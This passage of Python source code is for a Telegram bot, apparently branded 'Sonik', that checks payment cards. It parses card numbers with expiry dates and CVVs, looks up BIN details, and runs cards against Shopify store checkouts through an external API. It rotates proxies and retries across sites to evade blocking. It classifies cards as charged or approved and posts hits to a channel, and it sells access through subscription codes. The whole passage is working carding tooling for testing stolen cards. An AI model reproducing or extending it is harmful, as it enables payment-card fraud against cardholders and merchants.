        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text):
            cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))
def extract_urls_from_text(text):
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line: continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            norm = normalize_site_url(m.group(1).rstrip('/'))
            if norm and norm not in seen:
                seen.add(norm)
                result.append(norm)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].strip()
        if cleaned:
            norm = normalize_site_url(cleaned)
            if norm and norm not in seen:
                seen.add(norm)
                result.append(norm)
    return result
def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pt = 'http'
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if pm:
        pt, proxy = pm.group(1).lower(), pm.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m:
        u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        if 0 < int(pp) <= 65535:
            h, p, u, pw = ph, pp, pu, ppw
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
        h, p = m3.groups()
    else:
        return None
    if not h or not p:
        return None
    try:
        if not (0 < int(p) <= 65535):
            return None
    except:
        return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}
async def test_proxy(proxy_url):
    try:
        s = await get_proxy_session()
        async with s.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
            if r.status == 200:
                return True, (await r.json()).get('ip', '?')
            return False, None
    except:
        return False, None
async def test_proxies_batch(proxies_list):
    if not proxies_list:
        return []
    sem = asyncio.Semaphore(PROXY_CHECK_BATCH)
    async def test_one(p):
        async with sem:
            return await test_proxy(p['proxy_url'])
    results = await asyncio.gather(*[test_one(p) for p in proxies_list], return_exceptions=True)
    return results
async def get_bin_info(cn):
    bin_prefix = cn[:6]
    if bin_prefix in _BIN_CACHE:
        cache_time = _BIN_CACHE_TIME.get(bin_prefix, 0)
        if time.time() - cache_time < _BIN_CACHE_TTL:
            return _BIN_CACHE[bin_prefix]
    try:
        s = await get_bin_session()
        async with _BIN_SEM:
            async with s.get(f'https://bins.antipublic.cc/bins/{bin_prefix}') as r:
                if r.status != 200:
                    result = {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
                else:
                    d = await r.json(content_type=None)
                    result = {
                        "brand": d.get('brand', '-'),
                        "type": d.get('type', '-'),
                        "level": d.get('level', '-'),
                        "bank": d.get('bank', '-'),
                        "country": d.get('country_name', '-'),
                        "flag": d.get('country_flag', '🏳️')
                    }
                _BIN_CACHE[bin_prefix] = result
                _BIN_CACHE_TIME[bin_prefix] = time.time()
                return result
    except:
        result = {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
        _BIN_CACHE[bin_prefix] = result
        _BIN_CACHE_TIME[bin_prefix] = time.time()
        return result
def build_api_url(site, cc, proxy_data=None):
    if not site.startswith('http'):
        site = f'https://{site}'
    url = f'{API_BASE_URL}?site={quote(site, safe="")}&cc={quote(cc, safe="")}'
    if proxy_data:
        ip, port = proxy_data['ip'], proxy_data['port']
        un, pw = proxy_data.get('username'), proxy_data.get('password')
        ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps, safe="")}'
    return url
def classify_response(rj):
    res = rj.copy()
    ar = str(res.get('Response', ''))
    price = res.get('Price', '-')
    gw = res.get('Gate', res.get('Gateway', 'Shopify'))
    if price is not None and price != '-':
        if not str(price).startswith('$'):
            price = f"${price}"
    
    res.update({"Response": ar, "Price": price, "Gateway": gw})
    rl = ar.lower()
    
    if is_site_error(ar) or any(kw in rl for kw in REJECTED_RESPONSES):
        res["Status"] = "SiteError"
    elif any(k in rl for k in ['order_paid', 'order_placed', 'charged', 'payment successful']):
        res["Status"] = "Charged"
    elif any(k in rl for k in ['otp_required', '3d_authentication', 'insufficient_funds', 'cvc', '3ds_required']):
        res["Status"] = "Approved"
    else:
        res["Status"] = "Declined"
    return res
async def _check_card_api_internal(card, site, proxy_data=None, http_session=None):
    uid = "?"
    url = build_api_url(site if site.startswith('http') else f'https://{site}', card, proxy_data)
    s = http_session or (await get_user_http_session(0, "sp"))
    async with s.get(url) as r:
        if r.status != 200:
            return {"Response": f"HTTP_{r.status}", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
        try:
            rj = await r.json(content_type=None)
        except:
            return {"Response": "Invalid JSON", "Price": "-", "Gateway": "-", "Status": "SiteError", "card": card, "site": site}
    result = classify_response(rj)
    result["card"] = card
    result["site"] = site
    return result
async def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
    return await safe_api_call(_check_card_api_internal, card, site, proxy_data, http_session)
async def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
    if not sites:
        return {"Response": "No sites", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}
    tried_sites = set()
    tried_proxies = set()
    last = None
    for attempt in range(max_retries):
        if cancel_check and cancel_check():
            return {"Response": "Stopped", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}
        if rotator:
            site = rotator.pick_site(sites, exclude=tried_sites)
        else:
            available = [s for s in sites if s not in tried_sites] or list(sites)
            site = random.choice(available)
        tried_sites.add(site)
        proxy_data = None
        if proxies_data:
            if rotator:
                proxy_data = rotator.pick_proxy(proxies_data, exclude=tried_proxies)
            else:
                available_px = [p for p in proxies_data if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
                proxy_data = random.choice(available_px)
            if proxy_data:
                tried_proxies.add(proxy_data.get('proxy_url'))
        try:
            result = await check_card_api(card, site, proxy_data, user_id, http_session=http_session)
        except FloodWaitError as e:
            wait_time = e.seconds + 2
            log_user(user_id or "?", "FLOOD", f"Waiting {wait_time}s for card {card[:6]}***", "warning")
            await asyncio.sleep(wait_time)
            if attempt < max_retries - 1:
                continue
            else:
                raise
        except Exception as e:
            if attempt < max_retries - 1:
                await asyncio.sleep(0.3)
                continue
            else:
                return {"Response": str(e)[:100], "Price": "-", "Gateway": "Unknown", "Status": "Error", "card": card, "site": site}
        if result.get("Status") != "SiteError":
            if rotator:
                rotator.report_site_ok(site)
                if proxy_data:
                    rotator.report_proxy_ok(proxy_data.get('proxy_url'))
            return result
        if rotator:
            rotator.report_site_fail(site)
            if proxy_data and is_proxy_error(result.get("Response", "")):
                rotator.report_proxy_fail(proxy_data.get('proxy_url'))
        last = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)
    if last:
        last["Status"] = "Error"
        return last
    return {"Response": "Max retries", "Price": "-", "Gateway": "-", "Status": "Error", "card": card}
async def test_site(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
    try:
        url = build_api_url(site if site.startswith('http') else f'https://{site}', test_card, proxy_data)
        s = http_session or (await get_user_http_session(0, "site"))
        async with s.get(url) as resp:
            if resp.status != 200:
                return {'site': site, 'status': 'dead', 'price': '-', 'response': f'HTTP_{resp.status}', 'price_val': 999}
            try:
                raw = await resp.json(content_type=None)
            except:
                return {'site': site, 'status': 'dead', 'price': '-', 'response': 'Invalid JSON', 'price_val': 999}
        rm = raw.get('Response', '')
        price = raw.get('Price', '-')
        price_val = 999.0
        if price and price != '-':
            try:
                price_val = float(str(price).replace('$', '').strip())
            except:
                pass
        if is_site_error(rm.lower()):
            return {'site': site, 'status': 'dead', 'price': price, 'response': rm, 'price_val': price_val}
        return {'site': site, 'status': 'alive', 'price': price, 'response': rm, 'price_val': price_val}
    except Exception as e:
        return {'site': site, 'status': 'dead', 'price': '-', 'response': str(e)[:50], 'price_val': 999}
def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
    sm = {
        "Charged": (f"{gemj('fire')} <b>{bs('CHARGED')}</b> {gemj('fire')}", []),
        "Approved": (f"{gemj('check')} <b>{bs('APPROVED')}</b> {gemj('check')}", []),
        "Declined": (f"{gemj('declined')} <b>{bs('DECLINED')}</b> {gemj('declined')}", []),
        "Error": (f"{gemj('cross')} <b>{bs('ERROR')}</b> {gemj('cross')}", [])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    extra = ""
    if extra_field:
        extra = f"💰 <b>{bs(extra_field[0])}</b> ━ <code>{extra_field[1]}</code>\n"
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
💳 <b>{bs('Card')}</b>
⤷ <code>{card}</code>
🌐 <b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
📝 <b>{bs('Response')}</b> ━ <code>{response}</code>
{extra}<b>━━━━━━━━━━━━━━━━━</b>
🔢 <b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
🏦 <b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
🌍 <b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>
<b>━━━━━━━━━━━━━━━━━</b>
⏱️ <b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>
𝗗𝗲𝘃 → sonik""", he
def format_card_result(status, card, gateway, response, price="-", site="-", bin_info=None, elapsed=0.0):
    sm = {
        "Charged": (f"{gemj('fire')} <b>{bs('CHARGED')}</b> {gemj('fire')}", []),
        "Approved": (f"{gemj('check')} <b>{bs('APPROVED')}</b> {gemj('check')}", []),
        "Declined": (f"{gemj('declined')} <b>{bs('DECLINED')}</b> {gemj('declined')}", []),
        "Error": (f"{gemj('cross')} <b>{bs('ERROR')}</b> {gemj('cross')}", [])
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
💳 <b>{bs('Card')}</b>
⤷ <code>{card}</code>
🌐 <b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
📝 <b>{bs('Response')}</b> ━ <code>{response}</code>
💰 <b>{bs('Price')}</b> ━ <code>{ps}</code>
<b>━━━━━━━━━━━━━━━━━</b>
🔢 <b>{bs('BIN')}:</b> <code>{bi.get('brand', '-')} | {bi.get('type', '-')} | {bi.get('level', '-')}</code>
🏦 <b>{bs('Bank')}:</b> <code>{bi.get('bank', '-')}</code>
🌍 <b>{bs('Country')}:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>
<b>━━━━━━━━━━━━━━━━━</b>
⏱️ <b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>
𝗗𝗲𝘃 → sonik""", he
async def send_channel_hit(res, uid, username, name):
    try:
        sv = str(res.get("Status", "Charged")).upper()
        if sv in ["CHARGED", "APPROVED"]:
            prof = f"https://t.me/{username}" if username and not username.startswith("user_") else f"tg://user?id={uid}"
            gw = res.get('Gateway', 'Shopify')
            resp = res.get('Response', '')
            msg = f"""{gemj('hit_channel_emoji')} <b>{bs(sv)}</b> {gemj('hit_channel_emoji')}
<b>━━━━━━━━━━━━━━━━━</b>
💳 <b>{bs('Card')}</b>
⤷ <code>{res.get('card', res.get('Card', '-'))}</code>
🌐 <b>{bs('Gateway')}</b> ━ <code>{gw}</code>
📝 <b>{bs('Response')}</b> ━ <code>{resp}</code>
💰 <b>{bs('Price')}</b> ━ <code>{res.get('Price', '-')}</code>
👤 <b>{bs('User')}</b> ━ <a href="{prof}">{name}</a>
<b>━━━━━━━━━━━━━━━━━</b>
𝗗𝗲𝘃 → sonik"""
            HIT_BUTTON = [[Button.url(f"{gemj('rocket', for_button=True)} {bs('Sonik')}", f"https://t.me/{MAIN_BOT_USERNAME}")]]
            await styled_send(HIT_CHANNEL_ID, msg, buttons=HIT_BUTTON)
    except:
        pass
@client.on(events.NewMessage(pattern=r'(?i)^[/.](getid)$'))
async def get_emoji_id(event):
    if not event.reply_to_msg_id:
        return await event.reply("❌ Reply to a message containing the premium emoji you want.")
    msg = await event.get_reply_message()
    if not msg.entities:
        return await event.reply("❌ No entities found in this message.")
    found = False
    res = "📊 **Found Premium Emojis:**\n"
    for ent in msg.entities:
        if isinstance(ent, MessageEntityCustomEmoji):
            res += f"🔹 ID: ` {ent.document_id} `\n"
            found = True
    if found:
        await event.reply(res)
    else:
        await event.reply("❌ No premium emojis detected in that message.")
@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    try:
        uid = event.sender_id
        is_new = await db["users"].find_one({"user_id": uid}) is None
        await ensure_user(uid)
        await update_last_seen(uid)
        user = await db["users"].find_one({"user_id": uid})
        if is_new:
            sender = await event.get_sender()
            first_name = sender.first_name or "Unknown"
            last_name = sender.last_name or ""
            username = f"@{sender.username}" if sender.username else "No Username"
            admin_msg = f"""🆕 <b>{bs('NEW USER')}</b> 🆕
<b>━━━━━━━━━━━━━━━━━</b>
👤 <b>{bs('Name')}:</b> <code>{first_name} {last_name}</code>
🆔 <b>{bs('ID')}:</b> <code>{uid}</code>
🔗 <b>{bs('User')}:</b> {username}
<b>━━━━━━━━━━━━━━━━━</b>
𝗗𝗲𝘃 → sonik"""
            for admin_id in ADMIN_ID:
                try:
                    await client.send_message(admin_id, admin_msg, parse_mode='html')
                except:
                    pass
        if not await force_join_check(event): return
        if await is_banned_user(uid):
            t, e = banned_user_message()
            return await styled_reply(event, t, emoji_ids=e)
        sub = await get_user_subscription(uid)
        user_name = (await event.get_sender()).first_name or "User"
        access_type = "OWNER" if uid in ADMIN_ID else (sub["plan"].upper() if sub["is_active"] else "TRIAL")
        credits = "Unlimited" if uid in ADMIN_ID else "250"
        joined_date = user.get("created_at", datetime.now()).strftime("%Y-%m-%d") if user else datetime.now().strftime("%Y-%m-%d")
        text_raw = f"""{gemj('fire_premium')} <b>{bs('User')}:</b> <i>{user_name}</i> 🃏
{gemj('heart_fire')} <b>{bs('User ID')}:</b> <code>{uid}</code>
{gemj('diamond')} <b>{bs('Access')}:</b> <b>{access_type}</b>
{gemj('wine')} <b>{bs('Credits')}:</b> <code>{credits}</code>
{gemj('snowman')} <b>{bs('Joined')}:</b> <code>{joined_date}</code>
<b>━━━━━━━━━━━━━━━━━</b>
𝗗𝗲𝘃 → sonik"""
        kb = [
            [
                Button.inline(f"{gemj('fire_premium', for_button=True)} {bs('CHECKER MENU')}", data="menu_checker", style="success"),
                Button.inline(f"{gemj('diamond', for_button=True)} {bs('SITES CONTROL')}", data="menu_sites", style="success")
            ],
            [
                Button.inline(f"{gemj('sled', for_button=True)} {bs('PROXY CONTROL')}", data="menu_proxy", style="danger"),
                Button.inline(f"{gemj('cool', for_button=True)} {bs('MY ACCOUNT')}", data="menu_account", style="danger")
            ],
            [
                Button.inline(f"{gemj('snowman', for_button=True)} {bs('ADMIN PANEL')}", data="menu_admin", style="primary")
            ],
            [
                Button.url(f"{gemj('wine', for_button=True)} {bs('UPGRADE TO PREMIUM')}", url=f"https://t.me/{PAYMENT_BOT_USERNAME}", style="success")
            ],
            [
                Button.url(f"{gemj('heart_fire', for_button=True)} {bs('OFFICIAL CHANNEL')}", url="https://t.me/ReGict7", style="primary"),
                Button.url(f"{gemj('cool', for_button=True)} {bs('SUPPORT')}", url="https://t.me/ISoonik", style="primary")
            ]
        ]
        
        caption_text, entities = build_entities(text_raw)
        video_link = "https://t.me/Joker73336/7"
        try:
            await client.send_file(event.chat_id, video_link, caption=caption_text, formatting_entities=entities, buttons=kb)
        except:
            try:
                await client.send_file(event.chat_id, video_link, caption=text_raw, parse_mode='html', buttons=kb)
            except:
                try:
                    await client.send_message(event.chat_id, caption_text, formatting_entities=entities, buttons=kb, link_preview=False)
                except:
                    clean_text = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text_raw)
                    await client.send_message(event.chat_id, clean_text, buttons=kb, parse_mode='html', link_preview=False)
    except Exception as e:
        log_user(event.sender_id, "START_ERROR", f"Error={e}", "error")
@client.on(events.CallbackQuery(data=b"check_joined"))
async def check_joined_cb(event):
    uid = event.sender_id
    if uid in ADMIN_ID:
        return await event.answer(f"✅ {bs('Admin')}!")
    if await is_user_joined(uid):
        await event.answer(f"✅ {bs('Verified')}!", alert=True)
        try:
            await event.delete()
        except:
            pass
        await styled_send(event.chat_id, f"⚡ <b>{bs('Welcome to Sonik')}</b> ⚡\n📝 <code>/start</code> <b>{bs('for commands')}</b>", emoji_ids=[CE["fire"], CE["fire"], CE["info"]])
    else:
        await event.answer(f"❌ {bs('Not joined')}!", alert=True)
@client.on(events.NewMessage(pattern=r'(?i)^[/.]code\b'))
async def generate_code_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"🚫 <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
    if await check_maintenance(event):
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, f"""🎁 <b>{bs('Generate Code')}</b> 🎁
<b>━━━━━━━━━━━━━━━━━</b>
📝 <code>/code hours</code>
💡 <i>{bs('Example: /code 24')}</i>
⏳ <i>{bs('Generates a code for 24 hours subscription')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
⏰ <b>{bs('Codes expire in')}:</b> <code>{CODE_EXPIRY_HOURS}h</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"]])
    try:
        hours = int(parts[1])
        if hours <= 0:
            return await styled_reply(event, f"⚠️ <b>{bs('Hours must be positive')}</b>", emoji_ids=[CE["cross"]])
        code = await create_subscription_code(event.sender_id, hours)
        await styled_reply(event, f"""🎁 <b>{bs('Code Generated')}</b> 🎁
<b>━━━━━━━━━━━━━━━━━</b>
🔑 <b>{bs('Code')}:</b> <code>{code}</code>
⏰ <b>{bs('Hours')}:</b> <code>{hours}h</code>
⏳ <b>{bs('Expires In')}:</b> <code>{CODE_EXPIRY_HOURS}h</code>
<b>━━━━━━━━━━━━━━━━━</b>
💡 <i>{bs('Share this code with users')}</i>
📝 <i>{bs('They can use: /redeem CODE')}</i>""", emoji_ids=[CE["gift"], CE["gift"], CE["star"], CE["gem"], CE["info"]])
    except ValueError:
        await styled_reply(event, f"⚠️ <b>{bs('Invalid hours')}</b>", emoji_ids=[CE["cross"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem\b'))
async def redeem_code_cmd(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    uid = event.sender_id
    if await is_banned_user(uid):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, f"""🎁 <b>{bs('Redeem Code')}</b> 🎁
<b>━━━━━━━━━━━━━━━━━</b>
📝 <code>/redeem CODE</code>
💡 <i>{bs('Example: /redeem ABC12345')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
💡 <i>{bs('Enter the code you received from admin')}</i>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"]])
    code = parts[1].strip().upper()
    try:
        code_data = await db["codes"].find_one({"code": code})
        if not code_data:
            return await styled_reply(event, f"""🚫 <b>{bs('Invalid Code')}</b> 🚫
<b>━━━━━━━━━━━━━━━━━</b>
❌ <b>{bs('The code does not exist')}</b>
💡 <i>{bs('Please check and try again')}</i>""", emoji_ids=[CE["cross"], CE["cross"], CE["warn"], CE["info"]])
        if code_data.get("used", False):
            return await styled_reply(event, f"""🚫 <b>{bs('Code Already Used')}</b> 🚫
<b>━━━━━━━━━━━━━━━━━</b>
❌ <b>{bs('This code has already been redeemed')}</b>
💡 <i>{bs('Used by another user')}</i>""", emoji_ids=[CE["cross"], CE["cross"], CE["warn"], CE["info"]])
        expires_at = code_data.get("expires_at")
        if expires_at:
            if expires_at.tzinfo is None:
                expires_at = expires_at.replace(tzinfo=timezone.utc)
            if expires_at < datetime.now(timezone.utc):
                return await styled_reply(event, f"""⏰ <b>{bs('Code Expired')}</b> ⏰
<b>━━━━━━━━━━━━━━━━━</b>
❌ <b>{bs('This code has expired')}</b>
💡 <i>{bs('Please contact admin for a new code')}</i>""", emoji_ids=[CE["cross"], CE["cross"], CE["warn"], CE["info"]])
        if uid in ADMIN_ID:
            return await styled_reply(event, f"""👑 <b>{bs('Admin Access')}</b> 👑
<b>━━━━━━━━━━━━━━━━━</b>
✅ <b>{bs('You are an admin')}</b>
💡 <i>{bs('Admins already have full access')}</i>
💡 <i>{bs('Use /give to give subscriptions to users')}</i>""", emoji_ids=[CE["crown"], CE["crown"], CE["info"]])
        if await is_user_subscribed(uid):
            return await styled_reply(event, f"""✅ <b>{bs('Already Subscribed')}</b> ✅
<b>━━━━━━━━━━━━━━━━━</b>
✅ <b>{bs('You already have an active subscription')}</b>
⏳ <i>{bs('Wait for your subscription to expire')}</i>""", emoji_ids=[CE["warn"], CE["warn"], CE["info"]])
        result = await redeem_code(uid, code)
        if result["success"]:
            try:
                sender = await event.get_sender()
                name = sender.first_name or "User"
                for admin in ADMIN_ID:
                    await styled_send(admin, f"""✅ <b>Code Redeemed!</b>
<b>━━━━━━━━━━━━━━━━━</b>
👤 <b>User:</b> <code>{uid}</code>
📛 <b>Name:</b> {name}
🔑 <b>Code:</b> <code>{code}</code>
⏰ <b>Hours:</b> <code>{result['hours']}h</code>
⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}""", emoji_ids=[CE["check"], CE["gift"]])
            except:
                pass
            await styled_reply(event, f"""🎉 <b>{bs('Code Redeemed Successfully!')}</b> 🎉
<b>━━━━━━━━━━━━━━━━━</b>
✅ <b>{bs('Subscription Added')}</b>
⏰ <b>{bs('Hours')}:</b> <code>{result['hours']}h</code>
<b>━━━━━━━━━━━━━━━━━</b>
💡 <i>{bs('You can now use all bot features')}</i>
📝 <code>/start</code> {bs('to see commands')}""", emoji_ids=[CE["gift"], CE["gift"], CE["check"], CE["star"], CE["info"]])
        else:
            await styled_reply(event, f"""🚫 <b>{bs('Failed to Redeem')}</b> 🚫
<b>━━━━━━━━━━━━━━━━━</b>
❌ <b>{bs('Error')}:</b> <code>{result['message']}</code>
💡 <i>{bs('Please try again or contact admin')}</i>""", emoji_ids=[CE["cross"], CE["cross"], CE["warn"], CE["info"]])
    except Exception as e:
        log_user(uid, "REDEEM_ERROR", f"Error: {e}", "error")
        await styled_reply(event, f"""⚠️ <b>{bs('Error')}</b> ⚠️
<b>━━━━━━━━━━━━━━━━━</b>
❌ <b>{bs('An error occurred')}</b>
📝 <code>{str(e)[:100]}</code>
💡 <i>{bs('Please try again or contact admin')}</i>""", emoji_ids=[CE["cross"], CE["cross"], CE["warn"], CE["info"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]codes$'))
async def list_codes_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"🚫 <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
    try:
        codes = await db["codes"].find().sort("created_at", -1).to_list(length=50)
        if not codes:
            return await styled_reply(event, f"📋 <b>{bs('No codes found')}</b>\n🎁 <code>/code hours</code> {bs('to generate')}", emoji_ids=[CE["warn"]])
        text = f"""📋 <b>{bs('Recent Codes')}</b> ({len(codes)}) 📋
<b>━━━━━━━━━━━━━━━━━</b>
"""
        for code_data in codes[:20]:
            code = code_data.get('code', '?')
            hours = code_data.get('hours', '?')
            used = "✅" if code_data.get('used', False) else "⬜"
            created_by = code_data.get('created_by', '?')
            expires = code_data.get('expires_at')
            if expires:
                expires_str = expires.strftime('%m-%d %H:%M')
            else:
                expires_str = '?'
            text += f"🔑 {used} <code>{code}</code> ━ {hours}h ━ {expires_str}\n"
        if len(codes) > 20:
            text += f"\n<i>+{len(codes)-20} more</i>"
        text += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n✅ Used | ⬜ Available"
        await styled_reply(event, text, emoji_ids=[CE["fire"], CE["fire"], CE["gift"]])
    except Exception as e:
        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
async def add_site(event):
    if event.sender_id not in ADMIN_ID:
        return await styled_reply(event, f"🚫 <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    try:
        sites_list = []
        if event.is_reply:
            rm = await event.get_reply_message()
            if rm and rm.file:
                fp = await rm.download_media()
                try:
                    async with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f:
                        content = await f.read()
                        sites_list = extract_urls_from_text(content)
                finally:
                    try:
                        os.remove(fp)
                    except:
                        pass
            elif rm and rm.text:
                sites_list = extract_urls_from_text(rm.text)
        add_text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
        if add_text:
            sites_list.extend(extract_urls_from_text(add_text))
        if not sites_list:
            return await styled_reply(event, f"""➕ <b>{bs('Add Site')}</b> ➕
<b>━━━━━━━━━━━━━━━━━</b>
📝 <code>/add site.com</code>
💡 <i>{bs('Or reply to a .txt file')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
✅ <i>{bs('Only accepted responses:')}</i>
📝 <i>3DS_REQUIRED | INSUFFICIENT_FUNDS | CARD_DECLINED | ORDER_PAID | CHARGED | PAYMENT_SUCCESSFUL</i>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["link"]])
        sites_list = list(dict.fromkeys(sites_list))
        existing_sites = await get_global_sites()
        existing_norm = {normalize_site_url(s) for s in existing_sites}
        new_sites = []
        already_exists = []
        for site in sites_list:
            norm = normalize_site_url(site)
            if norm in existing_norm:
                already_exists.append(norm)
            else:
                new_sites.append(norm)
        if not new_sites:
            return await styled_reply(event, f"⚠️ <b>{bs('All sites already exist')}</b> ⚠️\n📋 <b>{bs('Duplicates')}:</b> <code>{len(already_exists)}</code>", emoji_ids=[CE["warn"], CE["warn"], CE["info"]])
        PENDING_ADD_SITES[event.sender_id] = {"sites": new_sites, "exists": already_exists, "event": event}
        kb = [
            [pbtn(f"💰 {bs('0.01-5 USD')}", f"add_price_range:1:{event.sender_id}"), pbtn(f"💰 {bs('0.01-10 USD')}", f"add_price_range:2:{event.sender_id}")],
            [pbtn(f"💰 {bs('0.01-20 USD')}", f"add_price_range:3:{event.sender_id}"), pbtn(f"💰 {bs('0.01-40 USD')}", f"add_price_range:4:{event.sender_id}")],
            [pbtn(f"💰 {bs('5-10 USD')}", f"add_price_range:5:{event.sender_id}"), pbtn(f"💰 {bs('5-20 USD')}", f"add_price_range:6:{event.sender_id}")],
            [pbtn(f"💰 {bs('10-20 USD')}", f"add_price_range:7:{event.sender_id}"), pbtn(f"💰 {bs('20-40 USD')}", f"add_price_range:8:{event.sender_id}")],
        ]
        await styled_reply(event, f"""💰 <b>{bs('Select Price Range')}</b> 💰
<b>━━━━━━━━━━━━━━━━━</b>
➕ <b>{bs('New Sites')}:</b> <code>{len(new_sites)}</code>
📋 <b>{bs('Already Exist')}:</b> <code>{len(already_exists)}</code>
<b>━━━━━━━━━━━━━━━━━</b>
✅ <i>{bs('Only working sites with accepted responses')}</i>
💰 <i>{bs('Sites with price above range will be excluded')}</i>""", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"], CE["info"]])
    except Exception as e:
        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
@client.on(events.CallbackQuery(pattern=rb"add_price_range:(\d+):(\d+)"))
async def add_price_range_cb(event):
    range_id = int(event.pattern_match.group(1).decode())
    admin_id = int(event.pattern_match.group(2).decode())
    if event.sender_id != admin_id:
        return await event.answer(f"🚫 {bs('Not for you')}!", alert=True)
    data = PENDING_ADD_SITES.pop(admin_id, None)
    if not data:
        return await event.answer(f"⏰ {bs('Expired')}!", alert=True)
    price_range = PRICE_RANGES.get(str(range_id), PRICE_RANGES["1"])
    await event.answer(f"🔍 {bs('Testing sites...')}!")
    try:
        await event.delete()
    except:
        pass
    asyncio.create_task(_process_add_sites_with_filter(data["event"], data["sites"], data["exists"], price_range))
async def _process_add_sites_with_filter(event, new_sites, already_exists, price_range):
    uid = event.sender_id
    total = len(new_sites)
    tested = 0
    working = 0
    dead = 0
    added = 0
    price_filtered = 0
    rejected_gateway = 0
    proxies = await get_all_user_proxies(uid)
    user_site_sem = get_user_sem(uid, "site")
    http_session = await get_user_http_session(uid, "site")
    sm = await styled_reply(event, f"🔍 <b>{bs('Testing')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
    async def test_and_add(site):
        nonlocal tested, working, dead, added, price_filtered, rejected_gateway
        async with user_site_sem:
            try:
